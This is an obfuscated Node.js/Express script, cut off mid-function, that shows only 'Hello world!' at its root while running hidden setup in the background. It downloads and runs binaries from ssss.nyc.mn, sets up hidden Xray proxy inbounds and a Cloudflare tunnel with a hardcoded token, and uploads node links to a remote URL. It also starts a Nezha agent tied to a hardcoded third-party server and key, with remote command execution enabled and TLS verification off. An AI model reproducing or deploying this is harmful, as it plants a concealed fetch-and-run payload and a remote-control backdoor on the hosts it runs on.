const _0x1ce074=_0x3355;(function(_0x396cda,_0x29f80b){const _0x4ab84d={_0x213802:0x10b,_0x4a5052:0xf8,_0x3a2963:0xa8},_0x37f1f1=_0x3355,_0x32ba9c=_0x396cda();while(!![]){try{const _0x217979=parseInt(_0x37f1f1(_0x4ab84d._0x213802))/0x1*(-parseInt(_0x37f1f1(0xa3))/0x2)+parseInt(_0x37f1f1(0xf6))/0x3+parseInt(_0x37f1f1(0x13b))/0x4*(-parseInt(_0x37f1f1(_0x4ab84d._0x4a5052))/0x5)+parseInt(_0x37f1f1(0xfc))/0x6*(parseInt(_0x37f1f1(0xf9))/0x7)+-parseInt(_0x37f1f1(0xb1))/0x8+-parseInt(_0x37f1f1(_0x4ab84d._0x3a2963))/0x9+-parseInt(_0x37f1f1(0x121))/0xa*(-parseInt(_0x37f1f1(0x10d))/0xb);if(_0x217979===_0x29f80b)break;else _0x32ba9c['push'](_0x32ba9c['shift']());}catch(_0x39fc65){_0x32ba9c['push'](_0x32ba9c['shift']());}}}(_0x565b,0xa073a));const express=require(_0x1ce074(0xb5)),app=express(),axios=require(_0x1ce074(0xf4)),os=require('os'),fs=require('fs'),path=require(_0x1ce074(0xd4)),{promisify}=require(_0x1ce074(0x95)),exec=promisify(require(_0x1ce074(0xbc))[_0x1ce074(0x90)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x1ce074(0x133)][_0x1ce074(0x82)]||'',PROJECT_URL=process[_0x1ce074(0x133)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x1ce074(0x133)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x1ce074(0x133)][_0x1ce074(0x80)]||_0x1ce074(0xcf),SUB_PATH=process[_0x1ce074(0x133)][_0x1ce074(0xbd)]||'tubo',PORT=process[_0x1ce074(0x133)][_0x1ce074(0xfd)]||process['env'][_0x1ce074(0x114)]||0xbb8,UUID=process['env'][_0x1ce074(0xe2)]||'bc766dee-3c96-4839-a380-de5c55111dbc',NEZHA_SERVER=process[_0x1ce074(0x133)][_0x1ce074(0x13e)]||'nezha.bo88.hidns.vip:443',NEZHA_PORT=process[_0x1ce074(0x133)][_0x1ce074(0x12b)]||'',NEZHA_KEY=process['env'][_0x1ce074(0x11b)]||_0x1ce074(0x83),ARGO_DOMAIN=process[_0x1ce074(0x133)][_0x1ce074(0xe3)]||_0x1ce074(0x9b),ARGO_AUTH=process[_0x1ce074(0x133)]['ARGO_AUTH']||_0x1ce074(0xad),ARGO_PORT=process[_0x1ce074(0x133)][_0x1ce074(0xe7)]||0x1f41,CFIP=process[_0x1ce074(0x133)][_0x1ce074(0x139)]||_0x1ce074(0x148),CFPORT=process[_0x1ce074(0x133)][_0x1ce074(0x12d)]||0x1bb,NAME=process[_0x1ce074(0x133)]['NAME']||'northflank';!fs[_0x1ce074(0x118)](FILE_PATH)?(fs[_0x1ce074(0xa7)](FILE_PATH),console[_0x1ce074(0xb9)](FILE_PATH+'\x20is\x20created')):console[_0x1ce074(0xb9)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3d56aa={_0x16963a:0x8a,_0x4bc26c:0x134,_0x4e008:0xb2},_0xe14b67=_0x1ce074,_0x299b52=_0xe14b67(_0x3d56aa._0x16963a);let _0x3b080b='';for(let _0x19ad22=0x0;_0x19ad22<0x6;_0x19ad22++){_0x3b080b+=_0x299b52[_0xe14b67(_0x3d56aa._0x4bc26c)](Math[_0xe14b67(_0x3d56aa._0x4e008)](Math[_0xe14b67(0x124)]()*_0x299b52[_0xe14b67(0xc6)]));}return _0x3b080b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x3355(_0xbea003,_0x3a9468){const _0x565b61=_0x565b();return _0x3355=function(_0x3355ae,_0x169496){_0x3355ae=_0x3355ae-0x80;let _0xaa3b45=_0x565b61[_0x3355ae];return _0xaa3b45;},_0x3355(_0xbea003,_0x3a9468);}let npmPath=path[_0x1ce074(0xbe)](FILE_PATH,npmName),phpPath=path[_0x1ce074(0xbe)](FILE_PATH,phpName),webPath=path[_0x1ce074(0xbe)](FILE_PATH,webName),botPath=path[_0x1ce074(0xbe)](FILE_PATH,botName),subPath=path[_0x1ce074(0xbe)](FILE_PATH,_0x1ce074(0x138)),listPath=path['join'](FILE_PATH,_0x1ce074(0xfe)),bootLogPath=path[_0x1ce074(0xbe)](FILE_PATH,_0x1ce074(0xce)),configPath=path['join'](FILE_PATH,_0x1ce074(0xba));function deleteNodes(){const _0x22345b={_0x3ffafa:0x118,_0x26a6db:0xd6,_0x452025:0x93,_0x58082d:0xc9,_0x3d0b53:0xfb,_0x360104:0x13a,_0x399401:0xea},_0x53b859=_0x1ce074;try{if(!UPLOAD_URL)return;if(!fs[_0x53b859(_0x22345b._0x3ffafa)](subPath))return;let _0x1195de;try{_0x1195de=fs['readFileSync'](subPath,_0x53b859(0xfb));}catch{return null;}const _0x3cc1f2=Buffer[_0x53b859(_0x22345b._0x26a6db)](_0x1195de,_0x53b859(_0x22345b._0x452025))[_0x53b859(_0x22345b._0x58082d)](_0x53b859(_0x22345b._0x3d0b53)),_0x282d0a=_0x3cc1f2[_0x53b859(0x126)]('\x0a')['filter'](_0x1c037d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x53b859(0x112)](_0x1c037d));if(_0x282d0a['length']===0x0)return;return axios[_0x53b859(_0x22345b._0x360104)](UPLOAD_URL+_0x53b859(0xac),JSON[_0x53b859(0x11d)]({'nodes':_0x282d0a}),{'headers':{'Content-Type':_0x53b859(0x106)}})[_0x53b859(_0x22345b._0x399401)](_0x4fda99=>{return null;}),null;}catch(_0x192f89){return null;}}function cleanupOldFiles(){const _0x524fe8={_0x3a64ab:0x8e,_0x568452:0x9d},_0x3ddb70={_0xc0fc8c:0xdf},_0x56e5a3=_0x1ce074;try{const _0x58feac=fs[_0x56e5a3(_0x524fe8._0x3a64ab)](FILE_PATH);_0x58feac[_0x56e5a3(_0x524fe8._0x568452)](_0x100104=>{const _0x5575a8=_0x56e5a3,_0x4d4c88=path[_0x5575a8(0xbe)](FILE_PATH,_0x100104);try{const _0x137f61=fs['statSync'](_0x4d4c88);_0x137f61[_0x5575a8(0x135)]()&&fs[_0x5575a8(_0x3ddb70._0xc0fc8c)](_0x4d4c88);}catch(_0x523719){}});}catch(_0x32b689){}}app[_0x1ce074(0x8b)]('/',function(_0x232bab,_0x21f0f3){const _0x3c1d2f=_0x1ce074;_0x21f0f3['send'](_0x3c1d2f(0xa5));});async function generateConfig(){const _0x130275={_0x3e56e2:0x9c,_0x2afc03:0xde,_0x2665d9:0xaf,_0x573ba3:0x149,_0xcc9160:0x137,_0x4db62f:0xde,_0x1127d1:0xca,_0x208006:0xe5,_0x25401d:0xca,_0x29ff7e:0x103,_0x135ae3:0x107,_0x3e367f:0xbe,_0x236757:0xba,_0x7d152c:0x11d},_0x5ec06d=_0x1ce074,_0x2eb858={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x5ec06d(0x137)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5ec06d(_0x130275._0x3e56e2),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x5ec06d(0x137),'fallbacks':[{'dest':0xbb9},{'path':_0x5ec06d(_0x130275._0x2afc03),'dest':0xbba},{'path':_0x5ec06d(_0x130275._0x2665d9),'dest':0xbbb},{'path':_0x5ec06d(0x107),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x5ec06d(0x137)}},{'port':0xbba,'listen':_0x5ec06d(_0x130275._0x573ba3),'protocol':_0x5ec06d(0x9c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5ec06d(_0x130275._0xcc9160)},'streamSettings':{'network':'ws','security':_0x5ec06d(0x137),'wsSettings':{'path':_0x5ec06d(_0x130275._0x4db62f)}},'sniffing':{'enabled':!![],'destOverride':[_0x5ec06d(0x142),_0x5ec06d(_0x130275._0x1127d1),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5ec06d(_0x130275._0x208006),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5ec06d(0xaf)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5ec06d(_0x130275._0x25401d),_0x5ec06d(_0x130275._0x29ff7e)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5ec06d(_0x130275._0xcc9160),'wsSettings':{'path':_0x5ec06d(_0x130275._0x135ae3)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5ec06d(0xca),_0x5ec06d(0x103)],'metadataOnly':![]}}],'dns':{'servers':[_0x5ec06d(0x127)]},'outbounds':[{'protocol':_0x5ec06d(0x10c),'tag':_0x5ec06d(0xe6)},{'protocol':_0x5ec06d(0xe9),'tag':_0x5ec06d(0x8c)}]};fs[_0x5ec06d(0xf1)](path[_0x5ec06d(_0x130275._0x3e367f)](FILE_PATH,_0x5ec06d(_0x130275._0x236757)),JSON[_0x5ec06d(_0x130275._0x7d152c)](_0x2eb858,null,0x2));}function getSystemArchitecture(){const _0x30ac66={_0xded363:0xa1,_0x33b6d0:0x11e},_0x4f4a61=_0x1ce074,_0x2deec1=os[_0x4f4a61(_0x30ac66._0xded363)]();return _0x2deec1===_0x4f4a61(_0x30ac66._0x33b6d0)||_0x2deec1==='arm64'||_0x2deec1===_0x4f4a61(0x84)?_0x4f4a61(0x11e):_0x4f4a61(0xb4);}function downloadFile(_0x54b43a,_0x168ba1,_0x2e461c){const _0x35df1d={_0x3edbbc:0xdc},_0x162251={_0x1c9ad0:0xbf,_0x10ead2:0x123,_0x3836c5:0x140,_0x1b0aac:0x10f},_0x16bc36={_0x1cd4ea:0x12a,_0x3fb75d:0xc3},_0x1ef540={_0x138c0e:0x123},_0x4a0167=_0x1ce074,_0x5cd6eb=_0x54b43a;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x480242=fs[_0x4a0167(0x111)](_0x5cd6eb);axios({'method':'get','url':_0x168ba1,'responseType':_0x4a0167(0xcc)})[_0x4a0167(_0x35df1d._0x3edbbc)](_0x1baac7=>{const _0x413ca8={_0x14eb3e:0x109,_0x3ac0d1:0xbf},_0x1b32a3=_0x4a0167;_0x1baac7['data'][_0x1b32a3(_0x16bc36._0x1cd4ea)](_0x480242),_0x480242['on'](_0x1b32a3(0x147),()=>{const _0x39f927=_0x1b32a3;_0x480242[_0x39f927(_0x413ca8._0x14eb3e)](),console[_0x39f927(0xb9)](_0x39f927(_0x413ca8._0x3ac0d1)+path[_0x39f927(0x123)](_0x5cd6eb)+_0x39f927(0x113)),_0x2e461c(null,_0x5cd6eb);}),_0x480242['on'](_0x1b32a3(_0x16bc36._0x3fb75d),_0x38edd2=>{const _0xd91291=_0x1b32a3;fs[_0xd91291(0x100)](_0x5cd6eb,()=>{});const _0x466809=_0xd91291(0xbf)+path[_0xd91291(_0x1ef540._0x138c0e)](_0x5cd6eb)+'\x20failed:\x20'+_0x38edd2[_0xd91291(0x10f)];console['error'](_0x466809),_0x2e461c(_0x466809);});})['catch'](_0x5532db=>{const _0x37e800=_0x4a0167,_0x15d193=_0x37e800(_0x162251._0x1c9ad0)+path[_0x37e800(_0x162251._0x10ead2)](_0x5cd6eb)+_0x37e800(_0x162251._0x3836c5)+_0x5532db[_0x37e800(_0x162251._0x1b0aac)];console['error'](_0x15d193),_0x2e461c(_0x15d193);});}async function downloadFilesAndRun(){const _0xe99b6={_0x560e7d:0xb9,_0x52f24c:0x110,_0x213208:0x94,_0x42002f:0x12e,_0x3e4626:0x119,_0x5b2b26:0xd5,_0x2b577a:0xb7,_0x313246:0xf3,_0x4cd816:0xc5,_0x26dedc:0x13c,_0x2e5db6:0x13f,_0x23c1de:0x9f,_0x2f4801:0x119,_0x1b09b7:0x13f,_0x25cab7:0x91,_0x165b56:0xb9,_0x52c3a4:0xb9,_0x4268d5:0xc3,_0x5aae2d:0xf2,_0x1f4e92:0xec},_0x47e85b=_0x1ce074,_0x31fab2=getSystemArchitecture(),_0x179e2b=getFilesForArchitecture(_0x31fab2);if(_0x179e2b['length']===0x0){console[_0x47e85b(_0xe99b6._0x560e7d)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x4b25e1=_0x179e2b['map'](_0x35980c=>{return new Promise((_0x5e5fca,_0x16b889)=>{downloadFile(_0x35980c['fileName'],_0x35980c['fileUrl'],(_0x17341a,_0x3722ed)=>{_0x17341a?_0x16b889(_0x17341a):_0x5e5fca(_0x3722ed);});});});try{await Promise[_0x47e85b(_0xe99b6._0x52f24c)](_0x4b25e1);}catch(_0x2d4106){console[_0x47e85b(0xc3)]('Error\x20downloading\x20files:',_0x2d4106);return;}function _0x25be6a(_0x538eda){const _0x29b524={_0x477a33:0x97},_0xf13fcb=_0x47e85b,_0x3e480a=0x1fd;_0x538eda[_0xf13fcb(0x9d)](_0x1210ff=>{const _0x1fa6be={_0x2b4caa:0xc3,_0x1e4742:0x86},_0x490140=_0xf13fcb;fs[_0x490140(0x118)](_0x1210ff)&&fs[_0x490140(_0x29b524._0x477a33)](_0x1210ff,_0x3e480a,_0x3eee76=>{const _0x5478f8=_0x490140;_0x3eee76?console[_0x5478f8(_0x1fa6be._0x2b4caa)](_0x5478f8(_0x1fa6be._0x1e4742)+_0x1210ff+':\x20'+_0x3eee76):console['log'](_0x5478f8(0x88)+_0x1210ff+':\x20'+_0x3e480a['toString'](0x8));});});}const _0x252c21=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x25be6a(_0x252c21);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xa7d730=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x47e85b(0x126)](':')[_0x47e85b(_0xe99b6._0x213208)]():'',_0x4e3bba=new Set([_0x47e85b(_0xe99b6._0x42002f),'8443',_0x47e85b(_0xe99b6._0x3e4626),_0x47e85b(0xd8),_0x47e85b(0xa0),'2053']),_0x50ea28=_0x4e3bba[_0x47e85b(_0xe99b6._0x5b2b26)](_0xa7d730)?'true':'false',_0x59cd13=_0x47e85b(0xb3)+NEZHA_KEY+_0x47e85b(0xb8)+NEZHA_SERVER+_0x47e85b(_0xe99b6._0x2b577a)+_0x50ea28+_0x47e85b(0xc8)+UUID;fs[_0x47e85b(0xf1)](path[_0x47e85b(0xbe)](FILE_PATH,_0x47e85b(_0xe99b6._0x313246)),_0x59cd13);const _0x22b3cc=_0x47e85b(_0xe99b6._0x4cd816)+phpPath+_0x47e85b(0x8d)+FILE_PATH+_0x47e85b(_0xe99b6._0x26dedc);try{await exec(_0x22b3cc),console['log'](phpName+_0x47e85b(_0xe99b6._0x2e5db6)),await new Promise(_0x532e10=>setTimeout(_0x532e10,0x3e8));}catch(_0x1bc181){console[_0x47e85b(0xc3)](_0x47e85b(_0xe99b6._0x23c1de)+_0x1bc181);}}else{let _0x5da552='';const _0x519a63=[_0x47e85b(0x12e),'8443',_0x47e85b(_0xe99b6._0x2f4801),'2087',_0x47e85b(0xa0),_0x47e85b(0x117)];_0x519a63[_0x47e85b(0xc2)](NEZHA_PORT)&&(_0x5da552=_0x47e85b(0x8f));const _0x5f0cf7=_0x47e85b(_0xe99b6._0x4cd816)+npmPath+_0x47e85b(0xab)+NEZHA_SERVER+':'+NEZHA_PORT+_0x47e85b(0x11a)+NEZHA_KEY+'\x20'+_0x5da552+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5f0cf7),console[_0x47e85b(0xb9)](npmName+_0x47e85b(_0xe99b6._0x1b09b7)),await new Promise(_0x4cfd22=>setTimeout(_0x4cfd22,0x3e8));}catch(_0x19012a){console[_0x47e85b(0xc3)](_0x47e85b(_0xe99b6._0x25cab7)+_0x19012a);}}}else console[_0x47e85b(_0xe99b6._0x165b56)](_0x47e85b(0xd3));const _0x22a75a='nohup\x20'+webPath+_0x47e85b(0xcb)+FILE_PATH+_0x47e85b(0x146);try{await exec(_0x22a75a),console[_0x47e85b(_0xe99b6._0x52c3a4)](webName+'\x20is\x20running'),await new Promise(_0xaecdff=>setTimeout(_0xaecdff,0x3e8));}catch(_0x415d8c){console[_0x47e85b(_0xe99b6._0x4268d5)](_0x47e85b(0x101)+_0x415d8c);}if(fs[_0x47e85b(0x118)](botPath)){let _0x45e849;if(ARGO_AUTH[_0x47e85b(_0xe99b6._0x5aae2d)](/^[A-Z0-9a-z=]{120,250}$/))_0x45e849=_0x47e85b(0xb0)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x45e849=_0x47e85b(0x122)+FILE_PATH+_0x47e85b(_0xe99b6._0x1f4e92):_0x45e849=_0x47e85b(0x10a)+FILE_PATH+_0x47e85b(0x85)+ARGO_PORT;try{await exec(_0x47e85b(_0xe99b6._0x4cd816)+botPath+'\x20'+_0x45e849+_0x47e85b(0xef)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x4b9a31=>setTimeout(_0x4b9a31,0x7d0));}catch(_0xbb96ec){console[_0x47e85b(_0xe99b6._0x4268d5)](_0x47e85b(0x120)+_0xbb96ec);}}await new Promise(_0x5230bf=>setTimeout(_0x5230bf,0x1388));}function _0x565b(){const _0x2462da=['Hello\x20world!','\x0a\x0atrojan://','mkdirSync','6783075pAijyv','https://amd64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/agent','\x20-s\x20','/api/delete-nodes','eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiZDM0ZjYyYTYtNDliYS00ZDBjLWE0ODUtNjc2YWNhMDI2ZjFjIiwicyI6Ik9URXpOakZsWWpZdE4yRTVNaTAwTVRjeUxXSmpaV010TVRRNE1UYzNZMlJpT1daaiJ9','https://amd64.ssss.nyc.mn/agent','/vmess-argo','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','4406536gLSHvw','floor','\x0aclient_secret:\x20','amd','express','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','log','config.json','\x0a\x20\x20\x20\x20','child_process','SUB_PATH','join','Download\x20','filter','\x22\x20>\x20/dev/null\x202>&1','includes','error','\x20>\x20nul\x202>&1','nohup\x20','length','?security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','toString','tls','\x20-c\x20','stream','country_code','boot.log','./tmp','push','countryCode','\x0a\x20\x20tunnel:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','path','has','from','/sub.txt\x20saved\x20successfully','2087','&fp=firefox&type=ws&host=','https://ipapi.co/json/','App\x20is\x20running','then','https://arm64.ssss.nyc.mn/web','/vless-argo','unlinkSync','platform','text/plain;\x20charset=utf-8','UUID','ARGO_DOMAIN','https://arm64.ssss.nyc.mn/bot','vmess','direct','ARGO_PORT','org','blackhole','catch','http\x20server\x20is\x20running\x20on\x20port:','/tunnel.yml\x20run','response','Skipping\x20adding\x20automatic\x20access\x20task','\x20>/dev/null\x202>&1\x20&','.exe\x20>\x20nul\x202>&1','writeFileSync','match','config.yaml','axios','pkill\x20-f\x20\x22[','2142126KBEUbK','readFileSync','265795LOQfRO','167839uQQHTf','https://amd64.ssss.nyc.mn/bot','utf-8','24PWIrLT','SERVER_PORT','list.txt','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','unlink','web\x20running\x20error:\x20','&path=%2Fvless-argo%3Fed%3D2560#','quic','Add\x20automatic\x20access\x20task\x20faild:\x20','Content-Type','application/json','/trojan-argo','Error\x20in\x20startserver:','close','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','56083wEFpGO','freedom','121MMqnee','http://ip-api.com/json/','message','all','createWriteStream','test','\x20successfully','PORT','send','Unknown','2053','existsSync','2096','\x20-p\x20','NEZHA_KEY','listen','stringify','arm','tunnel.yml','Error\x20executing\x20command:\x20','1589270PBafMs','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','basename','random','Error\x20reading\x20boot.log:','split','https+local://8.8.8.8/dns-query','clear','?encryption=none&security=tls&sni=','pipe','NEZHA_PORT','/vmess-argo?ed=2560','CFPORT','443','win32','status','del\x20/f\x20/q\x20','firefox','env','charAt','isFile','\x0a\x0avmess://','none','sub.txt','CFIP','post','28AybbAu','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','taskkill\x20/f\x20/im\x20','NEZHA_SERVER','\x20is\x20running','\x20failed:\x20','set','http','tunnel.json','\x0avless://','\x20>/dev/null\x202>&1','/config.json\x20>/dev/null\x202>&1\x20&','finish','cdns.doon.eu.org','127.0.0.1','FILE_PATH','\x0a\x20\x20credentials-file:\x20','UPLOAD_URL','30DfwSLyD9z1Aae8OvNLniSaacmkkgjG','aarch64','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Empowerment\x20failed\x20for\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Empowerment\x20success\x20for\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','abcdefghijklmnopqrstuvwxyz','get','block','\x20-c\x20\x22','readdirSync','--tls','exec','npm\x20running\x20error:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','base64','pop','util','https://amd64.ssss.nyc.mn/web','chmod','unshift','data','https://arm64.ssss.nyc.mn/v1','ds.bo88.indevs.in','vless','forEach','Nodes\x20uploaded\x20successfully','php\x20running\x20error:\x20','2083','arch','ARGO_DOMAIN:','8JGdhGt','Unhandled\x20error\x20in\x20startserver:'];_0x565b=function(){return _0x2462da;};return _0x565b();}function getFilesForArchitecture(_0x38a288){const _0x41ccfe={_0x2a21a9:0xfa,_0x5e8008:0xaa,_0x45bbee:0x11e,_0x577fb7:0x9a},_0x23bc31=_0x1ce074;let _0xe0a1c;_0x38a288===_0x23bc31(0x11e)?_0xe0a1c=[{'fileName':webPath,'fileUrl':_0x23bc31(0xdd)},{'fileName':botPath,'fileUrl':_0x23bc31(0xe4)}]:_0xe0a1c=[{'fileName':webPath,'fileUrl':_0x23bc31(0x96)},{'fileName':botPath,'fileUrl':_0x23bc31(_0x41ccfe._0x2a21a9)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x50d0be=_0x38a288==='arm'?_0x23bc31(_0x41ccfe._0x5e8008):_0x23bc31(0xae);_0xe0a1c['unshift']({'fileName':npmPath,'fileUrl':_0x50d0be});}else{const _0x17c9e6=_0x38a288===_0x23bc31(_0x41ccfe._0x45bbee)?_0x23bc31(_0x41ccfe._0x577fb7):_0x23bc31(0xa9);_0xe0a1c[_0x23bc31(0x98)]({'fileName':phpPath,'fileUrl':_0x17c9e6});}}return _0xe0a1c;}function argoType(){const _0x144eea={_0x265c4e:0xc2,_0x237e19:0x126,_0x95e588:0x143,_0x5292db:0xff,_0x537755:0xbe},_0x2bed28=_0x1ce074;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2bed28(_0x144eea._0x265c4e)]('TunnelSecret')){fs[_0x2bed28(0xf1)](path[_0x2bed28(0xbe)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x44d9c0=_0x2bed28(0xd2)+ARGO_AUTH[_0x2bed28(_0x144eea._0x237e19)]('\x22')[0xb]+_0x2bed28(0x81)+path[_0x2bed28(0xbe)](FILE_PATH,_0x2bed28(_0x144eea._0x95e588))+_0x2bed28(0x89)+ARGO_DOMAIN+_0x2bed28(_0x144eea._0x5292db)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x2bed28(0xf1)](path[_0x2bed28(_0x144eea._0x537755)](FILE_PATH,_0x2bed28(0x11f)),_0x44d9c0);}else console['log'](_0x2bed28(0x92));}async function extractDomains(){const _0x3ea011={_0x3afd1f:0xa2,_0x53e666:0xce,_0x576386:0x9d,_0x309e74:0xc6,_0xb4265e:0xc5,_0xa4c751:0xef,_0x43cc5a:0x120},_0x4a078a={_0x445535:0x99,_0x36fdf0:0x99,_0x3f9ac8:0xcd,_0x3c430a:0x99,_0x29df5f:0xe8,_0x4915a9:0x10e,_0x389b9d:0x130,_0x11df12:0x99,_0x13a325:0xd1,_0xf3e43:0x99},_0x583a44={_0x18655c:0xe0,_0x5247eb:0x13d,_0x57485f:0xf0,_0xe98ad:0xf5,_0x2cfab5:0xc1},_0x39fc98=_0x1ce074;let _0x126a0b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x126a0b=ARGO_DOMAIN,console[_0x39fc98(0xb9)](_0x39fc98(_0x3ea011._0x3afd1f),_0x126a0b),await _0x4acab3(_0x126a0b);else try{const _0x3f0413=fs['readFileSync'](path[_0x39fc98(0xbe)](FILE_PATH,_0x39fc98(_0x3ea011._0x53e666)),_0x39fc98(0xfb)),_0x416a44=_0x3f0413[_0x39fc98(0x126)]('\x0a'),_0x530b2c=[];_0x416a44[_0x39fc98(_0x3ea011._0x576386)](_0x3f4d7b=>{const _0x1da73a=_0x39fc98,_0x1186ba=_0x3f4d7b['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1186ba){const _0x28e7e4=_0x1186ba[0x1];_0x530b2c[_0x1da73a(0xd0)](_0x28e7e4);}});if(_0x530b2c[_0x39fc98(_0x3ea011._0x309e74)]>0x0)_0x126a0b=_0x530b2c[0x0],console['log']('ArgoDomain:',_0x126a0b),await _0x4acab3(_0x126a0b);else{console[_0x39fc98(0xb9)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x39fc98(0xbe)](FILE_PATH,_0x39fc98(0xce)));async function _0x894e93(){const _0x5b03ab=_0x39fc98;try{process[_0x5b03ab(_0x583a44._0x18655c)]==='win32'?await exec(_0x5b03ab(_0x583a44._0x5247eb)+botName+_0x5b03ab(_0x583a44._0x57485f)):await exec(_0x5b03ab(_0x583a44._0xe98ad)+botName[_0x5b03ab(0x134)](0x0)+']'+botName['substring'](0x1)+_0x5b03ab(_0x583a44._0x2cfab5));}catch(_0x1050c4){}}_0x894e93(),await new Promise(_0x467ee7=>setTimeout(_0x467ee7,0xbb8));const _0x1d85a3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x39fc98(_0x3ea011._0xb4265e)+botPath+'\x20'+_0x1d85a3+_0x39fc98(_0x3ea011._0xa4c751)),console[_0x39fc98(0xb9)](botName+'\x20is\x20running'),await new Promise(_0x533a2e=>setTimeout(_0x533a2e,0xbb8)),await extractDomains();}catch(_0x4ba3b5){console['error'](_0x39fc98(_0x3ea011._0x43cc5a)+_0x4ba3b5);}}}catch(_0x13391b){console[_0x39fc98(0xc3)](_0x39fc98(0x125),_0x13391b);}async function _0x255e5a(){const _0x1d0cd4=_0x39fc98;try{const _0x2a045e=await axios[_0x1d0cd4(0x8b)](_0x1d0cd4(0xda),{'timeout':0xbb8});if(_0x2a045e[_0x1d0cd4(_0x4a078a._0x445535)]&&_0x2a045e[_0x1d0cd4(_0x4a078a._0x36fdf0)][_0x1d0cd4(_0x4a078a._0x3f9ac8)]&&_0x2a045e[_0x1d0cd4(_0x4a078a._0x3c430a)][_0x1d0cd4(_0x4a078a._0x29df5f)])return _0x2a045e['data']['country_code']+'_'+_0x2a045e[_0x1d0cd4(0x99)][_0x1d0cd4(_0x4a078a._0x29df5f)];}catch(_0xe6046f){try{const _0x247364=await axios['get'](_0x1d0cd4(_0x4a078a._0x4915a9),{'timeout':0xbb8});if(_0x247364[_0x1d0cd4(_0x4a078a._0x3c430a)]&&_0x247364[_0x1d0cd4(_0x4a078a._0x3c430a)][_0x1d0cd4(_0x4a078a._0x389b9d)]==='success'&&_0x247364[_0x1d0cd4(0x99)]['countryCode']&&_0x247364[_0x1d0cd4(_0x4a078a._0x11df12)]['org'])return _0x247364[_0x1d0cd4(0x99)][_0x1d0cd4(_0x4a078a._0x13a325)]+'_'+_0x247364[_0x1d0cd4(_0x4a078a._0xf3e43)][_0x1d0cd4(0xe8)];}catch(_0x4a5d3a){}}return _0x1d0cd4(0x116);}async function _0x4acab3(_0x437ca3){const _0x171e8d=await _0x255e5a(),_0x5bed1b=NAME?NAME+'-'+_0x171e8d:_0x171e8d;return new Promise(_0x55843c=>{const 